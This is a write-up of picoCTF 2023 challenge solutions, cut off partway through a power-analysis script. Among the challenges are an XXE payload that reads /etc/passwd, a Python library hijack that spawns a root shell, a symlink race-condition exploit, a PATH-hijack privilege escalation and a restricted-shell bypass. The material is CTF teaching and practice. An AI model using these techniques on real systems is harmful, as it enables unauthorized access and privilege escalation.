# picoCTF 2023 Solved Questions Writeups

### By Leon

___

# chrono

**100 points**

AUTHOR: MUBARAK MIKAIL

Description
How to automate tasks to run at intervals on linux servers?
Additional details will be available after launching your challenge instance.

*Note:* This challenge launches an instance on demand.

___

When we launch the instance and `ssh` to the relevant credentials given to us we are presented with a shell.

Based on the question prompt it had to be `cron` jobs.

After various attempts to access `crontab` itself, I tried looking inside `/etc/crontab` with the `cat` command and it had the flag prompt for my session:

> picoCTF{Sch3DUL7NG_T45K3_L1NUX_d83baed1}

___
___

# hideme

**100 points**

AUTHOR: GEOFFREY NJOGU

Description
Every file gets a flag.
The SOC analyst saw one image been sent back and forth between two people. They decided to investigate and found out that there was more than what meets the eye [here]().

___

The file is a normal `PNG` image with pretty much nothing suspicious other than a hidden file within it accessed by `binwalk -e`.

`cd`-in into the directory named secret generated from the extraction had an image with the flag prompt in it:

> picoCTF{Hiddinng_An_imag3_within_@n_ima9e_85e04ab8}

___
___

# PcapPoisoning

**100 points**

AUTHOR: MUBARAK MIKAIL

Description
How about some hide and seek heh?
Download this [file]() and find the flag.

___

I just used strings and oh there was a sus string in the file, what could it be?

> picoCTF{P64P_4N4L7S1S_SU55355FUL_4d72dfcc}

___
___

# Ready Gladiator 0

**100 points**

AUTHOR: LT 'SYREAL' JONES

Description
Can you make a CoreWars warrior that always loses, no ties?
Your opponent is the Imp. The source is available [here](). If you wanted to pit the Imp against himself, you could download the Imp and start your own corewars server

*Note:* This challenge launches an instance on demand.

___

Ok so for this challenge I had to learn what `CoreWars` was, and its apparently its a game between two programs that are written in `RedCode` which is a pseudo-assembly language.

Our mission is to lose to the program provided 100 times.

After trying out what will happen if I provide the same code to the server, we just ended up with 100 ties.

So, I just deleted the only instruction that does operations in the game and I lost which gave the flag:

> picoCTF{h3r0_t0_z3r0_4m1r1gh7_a7bf8a57}

___
___

# Reverse

**100 points**

AUTHOR: MUBARAK MIKAIL

Description
Try reversing this file? Can ya?
I forgot the password to this [file](). Please find it for me?

___

Run strings on the file to get the flag.

> picoCTF{3lf_r3v3r5ing_succe55ful_7851ef7d}

___
___

# Rules 2023

**100 points**

AUTHOR: LT 'SYREAL' JONES

Description
Read the rules of the competition and get a little bonus!
[Rules](https://picoctf.org/competitions/2023-spring-rules.html)

___

If you look through the rules under `What are the other rules and terms for picoCTF 2023?` you can see the flag is an image (hence the hint saying `CTRL+f` won't work) and it says:

> picoCTF{h34rd_und3r5700d_4ck_cba1c711}

___
___

# rotation

**100 points**

AUTHOR: LOIC SHEMA

Description
You will find the flag after decrypting this file
Download the encrypted flag [here]().

___

Simple rotation cipher, brute-forcing works fine:

> picoCTF{r0tat1on_d3crypt3d_25d7c61b}

___
___

# timer

**100 points**

AUTHOR: LOIC SHEMA

Description
You will find the flag after analysing this apk
Download [here]().

___

I searched google *analyze apk file online* and I found this [site](https://www.sisik.eu/apk-tool). 

Uploading the file into it, the site said that the `versionName` of the file is:

> picoCTF{t1m3r_r3v3rs3d_succ355fully_17496}

___
___

# two-sum

**100 points**

Description
Can you solve this?
What two positive numbers can make this possible: n1 > n1 + n2 OR n2 > n1+ n2
Enter them here nc saturn.picoctf.net 57458. [Source]()

*Note:* This challenge launches an instance on demand.

___

The program asks us to provide 2 integers that would satisfy the equation:

`n1 > n1 + n2 OR n2 > n1 + n2 `

and in the code if we enter the branch:

```cpp
else if (addIntOvf(sum, num1, num2) == -1)
```

we will not exit the program (unlike the first one) and in order to finally get the flag we need to ensure that `num1 > 0 || num2 > 0`.

We can overflow the sum with 2 positive integers to satisfy all the conditions, so entering: `1073741824, 1073741824` we can get the flag:

> picoCTF{Tw0_Sum_Integer_Bu773R_0v3rfl0w_e06700c0}

___
___

# Safe Opener 2

**100 points**

AUTHOR: MUBARAK MIKAIL

Description
What can you do with this file?
I forgot the key to my safe but this [file]() is supposed to help me with retrieving the lost key. Can you help me unlock my safe?

___

Using an online java decompiler like [this one](http://www.javadecompilers.com/) we get the following code:

```java
import java.io.IOException;
import java.util.Base64;
import java.io.Reader;
import java.io.BufferedReader;
import java.io.InputStreamReader;

// 
// Decompiled by Procyon v0.5.36
// 

public class SafeOpener
{
    public static void main(final String[] args) throws IOException {
        final BufferedReader keyboard = new BufferedReader(new InputStreamReader(System.in));
        final Base64.Encoder encoder = Base64.getEncoder();
        String encodedkey = "";
        String key = "";
        for (int i = 0; i < 3; ++i) {
            System.out.print("Enter password for the safe: ");
            key = keyboard.readLine();
            encodedkey = encoder.encodeToString(key.getBytes());
            System.out.println(encodedkey);
            final boolean isOpen = openSafe(encodedkey);
            if (isOpen) {
                break;
            }
            System.out.println("You have  " + (2 - i) + " attempt(s) left");
        }
    }
    
    public static boolean openSafe(final String password) {
        final String encodedkey = "picoCTF{SAf3_0p3n3rr_y0u_solv3d_it_b427942b}";
        if (password.equals(encodedkey)) {
            System.out.println("Sesame open");
            return true;
        }
        System.out.println("Password is incorrect\n");
        return false;
    }
}
```

and so the flag is:

> picoCTF{SAf3_0p3n3rr_y0u_solv3d_it_b427942b}

___
___

# MSB

**200 points**

AUTHOR: LT 'SYREAL' JONES

Description
This image passes LSB statistical analysis, but we can't help but think there must be something to the visual artifacts present in this image...
Download the image [here]()

___

This type of challenge can be easily solved with [StegSolve](https://stegonline.georgeom.net/) because this site can extract LSB data with pixel order and RGB values.

I tried the first default option -> the first row in this site and got readable words, so I downloaded the whole file and `CTRL+F` the word `pico` I found the flag:

> picoCTF{15_y0ur_que57_qu1x071c_0r_h3r01c_06326238}

___
___

# Ready Gladiator 1

**200 points**

Description
Can you make a CoreWars warrior that wins?
Your opponent is the Imp. The source is available here. If you wanted to pit the Imp against himself, you could download the Imp and connect to the CoreWars server like this:
nc saturn.picoctf.net 58248 < imp.red
To get the flag, you must beat the Imp at least once out of the many rounds.

*Note:* This challenge launches an instance on demand.

___

I tried asking `chatGPT` to help me understand the syntax and what to do, but it gave me 3 programs that just lost with a weird syntax.

So the next thing I did is google, a reddit thread where someone asks how to beat the Imp gave the instructions:

```
sub 1, -10
jmp -1
```

and this code won 40 out of a 100 wins and got me the flag (still don't understand the game mostly...)

> picoCTF{1mp_1n_7h3_cr055h41r5_dba6f40d}

___
___

# Ready Gladiator 2

**400 points**

Description
Can you make a CoreWars warrior that wins every single round?
Your opponent is the Imp. The source is available here. If you wanted to pit the Imp against himself, you could download the Imp and connect to the CoreWars server like this:
nc saturn.picoctf.net 59243 < imp.red
To get the flag, you must beat the Imp all 100 rounds.

*Note:* This challenge launches an instance on demand.

___

So this is the final challenge in the series, we need to find the ultimate strategy to defeat the imp once and for all and constantly.

After numerous google searches I stumbled upon this reddit [thread](https://www.reddit.com/r/corewar/comments/11ulbs0/defeat_classic_imp/) and yeah, one of the comments literally says "Good luck in picoCTF23".

So google searching for the answer brought me to [link](https://everything2.com/title/corewars+imp) which states:

```
The best passive defense against an imp is known as an imp-gate. The imp-gate is an instruction that decrements some static location prior to the first code instruction of the warrior. E.g:

warrior          ; some attack code here
jmp warrior,<-10 ; decrement relative position -10
```

copying the code and sending it to the server wins the game and get us:

> picoCTF{d3m0n_3xpung3r_106bc275}

___
___

# MatchTheRegex

**100 points**

AUTHOR: SUNDAY JACOB NWANYIM

Description
How about trying to match a regular expression
The website is running here.

*Note:* This challenge launches an instance on demand.

___

Looking inside the script tag we can see:

```html
<script>
	function send_request() {
		let val = document.getElementById("name").value;
		// ^p.....F!?
		fetch(`/flag?input=${val}`)
			.then(res => res.text())
			.then(res => {
				const res_json = JSON.parse(res);
				alert(res_json.flag)
				return false;
			})
		return false;
	}

</script>
```

The regex is supposed to be `^p.....F!?`, literally the first and only guess was `picoCTF`, when I entered it gave the flag:

> picoCTF{succ3ssfully_matchtheregex_08c310c6}

___
___

# Permissions

**100 points**

AUTHOR: GEOFFREY NJOGU

Description
Can you read files in the root file?
Additional details will be available after launching your challenge instance.

*Note:* This challenge launches an instance on demand.

___

Connecting to the server and `cd`ing to `\` I saw a directory named challenge, inside it there was a file which when `cat`ing it game the flag.

> picoCTF{uS1ng_v1m_3dit0r_ad091ce1}

___
___

# repetitions

**100 points**

AUTHOR: THEONESTE BYAGUTANGAZA

Description
Can you make sense of this file?
Download the file [here]().

___

I was stuck on this until I read the title with the hint again.

The file itself looks like standard `base64` encoding but decrypting it gives seemingly random text.

With the hint `Multiple decoding is always good.` I repeatedly decoded the output of the text until the flag plaintext was visible:

> picoCTF{base64_n3st3d_dic0d!n8_d0wnl04d3d_4557ec3e}

___
___

# useless

**100 points**

AUTHOR: LOIC SHEMA

Description
There's an interesting script in the user's home directory
The work computer is running SSH. We've been given a script which performs some basic calculations, explore the script and find a flag.
Hostname: saturn.picoctf.net
Port:     60547
Username: picoplayer
Password: password

*Note:* This challenge launches an instance on demand.

___

That was a tricky challenge, in the home directory there is a file named `useless` that does command line arithmetic, spoiler, it does nothing.

The interesting thing to notice was the code itself, specifically the line:

```bash
else
    echo "Read the manual"
```

Using `man` on the script we get the flag hidden at the bottom of the page.

> picoCTF{us3l3ss_ch4ll3ng3_3xpl0it3d_7065}

I personally thought it had something to do with the `challenge` directory which was inaccessible, and I thought of privilege escalation things I could do, but alas, nope.

___
___

# Virtual Machine 0

**100 points**

AUTHOR: LT 'SYREAL' JONES

Description
Can you crack this black box?
We grabbed this design doc from enemy servers: [Download](). We know that the rotation of the red axle is input and the rotation of the blue axle is output. The following input gives the flag as output: [Download]().

___

I searched google what the heck is a `.dae` file is, and its a file for models and can be opened in blender.

Opening the model in blender we get a lego construction with 2 wheels: 

* Blue - 8 teeth
* Red - 40 teeth

We're told that the input is the number of times we turned the red wheel and the output is the number of times we turned the blue wheel.

Turing the red wheel once rotates the blue wheel 5 times so that's their relationship (idea from the hint), so if we just multiply the input by 5 we get the output which is a number that's supposed to be the flag. 

There's only one thing to do now and it's to decode it to bytes:

```python
from Crypto.Util.number import long_to_bytes

n = 39722847074734820757600524178581224432297292490103995908738058203639164185
print(long_to_bytes(n*5))
```

And we get the flag:

> picoCTF{g34r5_0f_m0r3_3537e50a}

___
___

# ReadMyCert

AUTHOR: SUNDAY JACOB NWANYIM

Description
How about we take you on an adventure on exploring certificate signing requests
Take a look at this CSR file [here]().

___

Damn this challenge, I spend two days on it because I did not notice that this was a certificate *REQUEST* and not a normal certificate.

Plugging into any online reader gives the flag:

> picoCTF{read_mycert_a7163be8}

___
___

# No way out

**200 points**

AUTHOR: KRIS

Description
Put this flag in standard picoCTF format before submitting. If the flag was h1_1m_7h3_f14g submit picoCTF{h1_1m_7h3_f14g} to the platform.
[Windows game](), Mac game

___

My very first introduction to unity hacking!

In the game you're spawned inside an area with a ladder but you can escape because of an invisible border.

After trying to look for the flag inside the files of the compiled game, I searched on google (and was probably put in a watchlist) on how to hack a unity game.

Ctf writeups pointed me to `dnSpy` a `C#` decompiling program that can be used to hack/mod unity games.

Using it and opening the games `Assembly-CSharp.dll` I could look inside the code.

In there I looked at the `PlayerController` class to see if I could make it so that I could jump infinitely to bypass the border.

I found this line of code that operates jumping:

```csharp
if (Input.GetButton("Jump") && this.canMove && this.characterController.isGrounded && !this.isClimbing)
{
    this.moveDirection.y = this.jumpSpeed;
}
```

and I removed the condition where it checks if the player is grounded from the `if` statement.

Compiling and exporting and opening the game once again, I could jump in the air to bypass the border and get outside the region where, when I went far enough gave the flag string in the middle of the string:

```
welcome_to_unity!!
```

So the flag was:

> picoCTF{welcome_to_unity!!}

___
___

# hijacking

**200 points**

AUTHOR: THEONESTE BYAGUTANGAZA

Description
Getting root access can allow you to read the flag. Luckily there is a python file that you might like to play with.
Through Social engineering, we've got the credentials to use on the server. SSH is running on the server.

*Note:* This challenge launches an instance on demand.

___

Wooooooooo python library hijacking!

So, google searching `using python for privilege escalation in linux` I got an [article](https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8) which detailed how to do just that (except the spawning shell part which I got from a youtube video).

Connecting to the server I checked what I can run with sudo with `sudo -l` and got:

```
User picoctf may run the following commands on challenge:
    (ALL) /usr/bin/vi
    (root) NOPASSWD: /usr/bin/python3 /home/picoctf/.server.py
```

Cool we can run the script with sudo.

Now inside the script we have an import of `base64`, we could hijack a function used by this library.

I changed the code to just run the commands:

```python
hi = "hi"
out = base64.b64encode(hi.encode('utf-8')).decode('utf-8')

print(out)

```

We need to hijack the function `b64encode` specifically to get root, and we could do so by editing the original library `base64.py`.

The file was located inside `/usr/lib/python3.8/base64.py` so running `vim` on it, I could edit the file.

I imported `pty` and at the start of the function `b64encode`, I added the line:

```python
def b64encode(s, altchars=None):
    """Encode the bytes-like object s using Base64 and return a bytes object.

    Optional altchars should be a byte string of length 2 which specifies an
    alternative alphabet for the '+' and '/' characters.  This allows an
    application to e.g. generate url or filesystem safe Base64 strings.
    """
    pty.spawn('/bin/bash')
    
    #code...
```

Finally, we can run the file with `sudo /usr/bin/python3 /home/picoctf/.server.py` got me a root shell!

Going into the directory `/challenge` and catting the file gives the flag:

> picoCTF{pYth0nn_libraryH!j@CK!n9_0083cb0b}

___
___

# money-ware

**100 points**

AUTHOR: JUNI19

Description
Flag format: picoCTF{Malwarename}
The first letter of the malware name should be capitalized and the rest lowercase.
Your friend just got hacked and has been asked to pay some bitcoins to 1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX. He doesn’t seem to understand what is going on and asks you for advice. Can you identify what malware he’s being a victim of?

___

Googling `1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX` I got the [link](https://www.bitcoinabuse.com/reports/1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX) which had reports with descriptions and one of those descriptions points us to:

More information here: [https://blog.avira.com/petya-strikes-back/](https://blog.avira.com/petya-strikes-back/)

This is an article about a vulnerability called `Petya` so our answer should be:

> picoCTF{petya}

___
___

# findme

**100 points**

Help us test the form by submiting the username as test and password as test!
The website running [here]().

*Note:* This challenge launches an instance on demand.

___

Welp I'm not sure what's happening but I did solve this.

I used `Burpsuite` to intercept the connection and see stuff I shouldn't.

When entering the credentials `test` and `test!` I had to forward different requests and there where two `sus` requests:

```
GET /next-page/id=cGljb0NURntwcm94aWVzX2Fs HTTP/1.1
GET /next-page/id=bF90aGVfd2F5X2RmNDRjOTRjfQ== HTTP/1.1
```

I decrypted the `ids` from base64 which gave the two parts of the flag that when combined gave me:

> picoCTF{proxies_all_the_way_df44c94c}

___
___

# Specialer

**300 points**

Description
Reception of Special has been cool to say the least. That's why we made an exclusive version of Special, called Secure Comprehensive Interface for Affecting Linux Empirically Rad, or just 'Specialer'. With Specialer, we really tried to remove the distractions from using a shell. Yes, we took out spell checker because of everybody's complaining. But we think you will be excited about our new, reduced feature set for keeping you focused on what needs it the most. Please start an instance to test your very own copy of Specialer.
ssh -p 64145 ctf-player@saturn.picoctf.net. The password is d8819d45

*Note:* This challenge launches an instance on demand.

___

Seeing as though I have not solved (maybe yet?) `Special` this challenge was way easier (and thus the point difference bothers me).

Connecting into the shell we're not allowed a lot of things like `cat, ls...`.

My solution was as follows:

I used `pwd` which was allowed to see where I was and the path I got was `/home/ctf-player/`, cool.

Next I figured I could `cd` and I knew that if I wanted to use tab-completion but had similar results pressing tab the autocompletion will give every file with the suffix I provided, so when you try to tab complete on files/directories that start with different letters it will provide you with the contents of the folder, so:

```
Specialer$ cd
.hushlogin  .profile    abra/       ala/        sim/
```

We can cd into any directory to check out its contents in the same way.

Inside `abra/` there were two files:

```
cadabra.txt   cadaniel.txt
```

To print out the contents I used `chatGPTs` suggestion:

```bash
$ printf "%s" "$( < file.txt )"
```

which actually worked because `printf` was allowed.

Those files were a dud but inside `ala/` printing out the file `kazam.txt` gave me the flag"

> picoCTF{y0u_d0n7_4ppr3c1473_wh47_w3r3_d01ng_h3r3_c42168d9}

___
___

# FindAndOpen

**200 points**

AUTHOR: MUBARAK MIKAIL

Description
Someone might have hidden the password in the trace file.
Find the key to unlock [this file](). This [tracefile]() might be good to analyze.

___

This was a kinda random challenge, using `strings` on the `.pcap` file I got a lot of random stuff but in between it there were a could of messages of interest:

```
Flying on Ethernet secret: Is this the flag
iBwaWNvQ1RGe1Could the flag have been splitted?
AABBHHPJGTFRLKVGhpcyBpcyB0aGUgc2VjcmV0OiBwaWNvQ1RGe1IzNERJTkdfTE9LZF8=
PBwaWUvQ1RGesabababkjaASKBKSBACVVAVSDDSSSSDSKJBJS
PBwaWUvQ1RGe1Maybe try checking the other file
```

Well basically I thought that the string:

`AABBHHPJGTFRLKVGhpcyBpcyB0aGUgc2VjcmV0OiBwaWNvQ1RGe1IzNERJTkdfTE9LZF8=`

was a base64 string but decoding it seperatly got nothing, and well if the file said: "Could the flag have been splitted?" I tried arranging:

```
iBwaWNvQ1RGe1, AABBHHPJGTFRLKVGhpcyBpcyB0aGUgc2VjcmV0OiBwaWNvQ1RGe1IzNERJTkdfTE9LZF8= and PBwaWUvQ1RGesabababkjaASKBKSBACVVAVSDDSSSSDSKJBJS
```

One after another to get something.

When I decoded the string: `iBwaWNvQ1RGe1PBwaWUvQ1RGe1AABBHHPJGTFRLKVGhpcyBpcyB0aGUgc2VjcmV0OiBwaWNvQ1RGe1IzNERJTkdfTE9LZF8=` in cyberchef I got the output:

```
...(garbage)This is the secret: picoCTF{R34DING_LOKd_
```

Well using it as the password to unlock the zip revealed a file which had the flag:

> picoCTF{R34DING_LOKd_fil56_succ3ss_cbf2ebf6}

___
___

# SOAP

**100 points**

AUTHOR: GEOFFREY NJOGU

Description
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?
Additional details will be available after launching your challenge instance.

___

I opened the website with `BurpSuite` and used proxy to see the requests to modify them.

Intercepting the request done by clicking on the `Details` button I could modify the `xml` data to perform an `XXE` attack just like the question suggests. 

*Reasource for the question:* [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) - it literally had the syntax to perform the attack, goated site.

So changing the parameters for the xml from:

```html
<?xml version="1.0" encoding="UTF-8"?><data><ID>1</ID></data>
```

To:

```html
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<data><ID>$xxe;</ID></data>
```

We successfully tricked the website to show the contents of `/etc/passwd` onto the screen and instead of the details. We get:

```
Invalid ID: root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin flask:x:999:999::/app:/bin/sh picoctf:x:1001:picoCTF{XML_3xtern@l_3nt1t1ty_e5f02dbf}
```

And at the bottom we can see flag is:

> picoCTF{XML_3xtern@l_3nt1t1ty_e5f02dbf}

___
___

# tic-tac

**200 points**

AUTHOR: JUNIAS BONOU

Description
Someone created a program to read text files; we think the program reads files with root privileges but apparently it only accepts to read files that are owned by the user running it.
ssh to saturn.picoctf.net:50591, and run the binary named "txtreader" once connected. Login as ctf-player with the password, d8819d45

*Note:* This challenge launches an instance on demand.

___

I don't want to curse but I hate this challenge.

I tried every possible idea with this symbolic linking script that is the only one on the internet and nothing else.

```cpp
#include <stdio.h>
#include<unistd.h>
#include <string.h>

int main(int argc, char * argv[]){
  unlink(argv[1]);
  symlink("/home/ctf-player/flag.txt",argv[1]);
}
```

But this is just **NOT FAST ENOUGH APPERANTLY**

Thank god `LiveOverflow` exists because after scraping the web with the utmost of `sus` google searches that probably put me on a list I found his video, directly solving this question [https://www.youtube.com/watch?v=5g137gsB9Wk&ab_channel=LiveOverflow](https://www.youtube.com/watch?v=5g137gsB9Wk&ab_channel=LiveOverflow) (you could skip this writeup and watch his video).

My explanation:

We want to create race conditions, such that the command execution would be like so:

```
--> Be a root file
--> Get checked by the programs if:
        // Check the file's owner.
        if (statbuf.st_uid != getuid()) {
            std::cerr << "Error: you don't own this file" << std::endl;
            return 1;
        }
--> Become readable with symbolic link
--> Get opened and read by the program:
        // Read the contents of the file.
        if (file.is_open()) {
            std::string line;
            while (getline(file, line)) {
            std::cout << line << std::endl;
            }
        } else {
            std::cerr << "Error: Could not open file" << std::endl;
            return 1;
        }
```

Instead of the code I showed above, there is a faster built in way in linux that this hidden from the internet does:

```cpp
#define _GNU_SOURCE
#include <stdio.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <linux/fs.h>

// source https://github.com/sroettger/35c3ctf_chals/blob/master/logrotate/exploit/rename.c
int main(int argc, char *argv[]) {
  while (1) {
    syscall(SYS_renameat2, AT_FDCWD, argv[1], AT_FDCWD, argv[2], RENAME_EXCHANGE);
  }
  return 0;
}
```

Running this script on two files, one with symbolic link to the flag and another user-made file tricks the reader program when it tried to read the symbolic-link file to print out the flag if you're lucky (just a few reruns needed).

And so:

> picoCTF{ToctoU_!s_3a5y_5748402c}

___
___

# who is it

**100 points**

AUTHOR: JUNIAS BONOU

Description
Someone just sent you an email claiming to be Google's co-founder Larry Page but you suspect a scam.
Can you help us identify whose mail server the email actually originated from?
Download the email file [here](). Flag: picoCTF{FirstnameLastname}

___

Looking into the `.eml` file its not very hard to see that the only IP address there is the attackers IP.

I tried for so long with many different websites to lookup either the mail or the IP and only [https://www.whatismyip.com/ip-whois-lookup/](https://www.whatismyip.com/ip-whois-lookup/) had the name of the person with the relevant IP: 173.249.33.206 and it's

```
Wilhelm Zwalina
```

So the answer is:

> picoCTF{WilhelmZwalina}

___
___

# VNE

**200 points**

AUTHOR: JUNIAS BONOU

Description
We've got a binary that can list directories as root, try it out !!
Additional details will be available after launching your challenge instance.

*Note:* This challenge launches an instance on demand.

___

First the script expects us to have an environment variable set for SECRET_DIR.

There are two potential directories that have the same flag (I checked): 

```
/challenge
/root
```

I originally picked `/root`.

Running the program it gives returns:

```
Listing the content of /root as root:
flag.txt
```

Now the fun part, hint 2 tells us to "Find a way to add more instructions to the ls".

First I tried using alias --> nada,

I tried using function ls() --> nada.

And on and on, until I tried the following.

I made a script called `ls` using `cat >> ls` and typed the code:

```bash
#!/bin/bash

/bin/ls
/bin/cat /root/flag.txt
```

Then I made it executable with `chmod +x ls`.

Finally to trick the shell into running this version of `ls` instead of the builtin way we add the path to the current directory as the first directory that the shell will look for its commands with:

```bash
export PATH=/home/ctf-player/:$PATH
```

NOW, when running the script, it runs in the background the `ls` command and it looks at the PATH and sees a file called `ls` inside the first directory `/home/ctf-player` and executes its code with root priviledges and we get the flag:

> picoCTF{Power_t0_man!pul4t3_3nv_fc3ff2c9}

___
___

# HideToSee

**100 points**

AUTHOR: SUNDAY JACOB NWANYIM

Description
How about some hide and seek heh?
Look at this image [here]().

___

The worst challenge in this competition.

Just put the file into [https://futureboy.us/stegano/decinput.html](https://futureboy.us/stegano/decinput.html)

and it will magically give you the flag in `atbash` decode it with `decode.fr` and get the flag.

This challenge was `guess the website we did to exctract the flag` and this was branded as a cryptography challenge. So missleading.

anyway:

> picoCTF{atbash_crack_1f84d779}

___
___

# Special

**300 points**

AUTHOR: LT 'SYREAL' JONES

Description
Don't power users get tired of making spelling mistakes in the shell? Not anymore! Enter Special, the Spell Checked Interface for Affecting Linux. Now, every word is properly spelled and capitalized... automatically and behind-the-scenes! Be the first to test Special in beta, and feel free to tell us all about how Special streamlines every development process that you face. When your co-workers see your amazing shell interface, just tell them: That's Special (TM)
Start your instance to see connection details.
ssh -p 49562 ctf-player@saturn.picoctf.net
The password is 483e80d4

*Note:* This challenge launches an instance on demand.

___

This was a very, very hard challenge for me.

This challenge had a lot going on, first, you couldn't enter slashes at the beginning, or type the word shell or use `:set` --> the easy options out.

What could you do?

If you typed your commands using the `$()` syntax, they would work... kinda... sometimes...

Using `$(ls)` it gave the error: `sh: 1: blargh: not found` and that means theres something called `blargh` in the directory.

It was very troublesome to perform anything on it because the autocorrect would kick in.

After many days (literal days) I figured out that I could split my commands in one line and prevent the capitaliazation of commands like `cat`.

I noticed that the command `$(echo)` worked and did nothing so I used it to eat up the capitalization at the start and in the same line used cat normally on the blargh directory.

For some reason, the autocorrect, the `/` checker did not work if I just split the commands with `;` so the final code to get the flag was:

```bash
$(echo); cat /blargh/*
```

which gave the flag:

> picoCTF{5p311ch3ck_15_7h3_w0r57_b741d1b1}

___
___

# PowerAnalysis: Warmup

AUTHOR: ANISH SINGHANI

Description
This encryption algorithm leaks a "bit" of data every time it does a computation. Use this to figure out the encryption key.
Additional details will be available after launching your challenge instance.

*Note:* This challenge launches an instance on demand.

___

This was the most research I did for a challenge ever.

First, what is power analysis? 

In basic terms (I'm not an expert at all), it's a way to get information by measuring the voltage during an operation, for us it's cracking AES.

This challenge did not involve measuring time/voltage and we are just getting the amout of bits leaked during the encryption.

What do we do anyway?

If we could isolate one byte of the plaintext we enter and know if it leaked a bit, we could break the encryption.

I think, either my way was super bad or there had to have been a better way to bruteforce inputs.

My way:

1. I found a unique string that returned 16 leaked bits, this ensures the position of each comparison (if I leaked 8 bits, I don't actually know which bits were leaked). Method: bruteforce by hand (bad)

I got the string: `b'ddddddddd0ddddddd3d0ddd0dddddddd'` 

2. For every byte in the sent string, I replaced it with every value between 0x00 to 0xff (16*16 possibilies) that means I send strings like:

```
00ddddddd0ddddddd3d0ddd0dddddddd
01ddddddd0ddddddd3d0ddd0dddddddd
02ddddddd0ddddddd3d0ddd0dddddddd
...
ffddddddd0ddddddd3d0ddd0dddddddd
```

And get only the values that satisfied the equation:

```python
Sbox[byte_of_plaintext_at_i ^ byte_of_plaintext_at_i] & 0x01 == 0x01
```

How?

If the value of the leaked bits is still 16.

After getting a huge array of the possible bytes, we can iterate through every possible key_byte combination and find the *only* one that satisfies

```python
Sbox[byte_we_got ^ key_value_bruteforced] & 0x01 == 0x01
```

For every byte we got previously.

This gets us the hex value of every byte of the key at every position and thus the key.

I used two python scripts because I'm bad.

Getting the bytes array:

```python
from pwn import *

Sbox = (
    0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76,
    0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0,
    0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15,
    0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75,
    0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84,
    0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF,
    0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8,
    0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2,
    0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73,
    0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB,
    0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79,
    0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08,
    0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A,
    0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E,
    0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF,
    0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16,
)

part1 = b'dd'
part2 = b'ddddd0ddddddd3d0ddd0dddddddd'
pt = b'ddddddddd0ddddddd3d0ddd0dddddddd'

barray = []
for j in range(15,16):
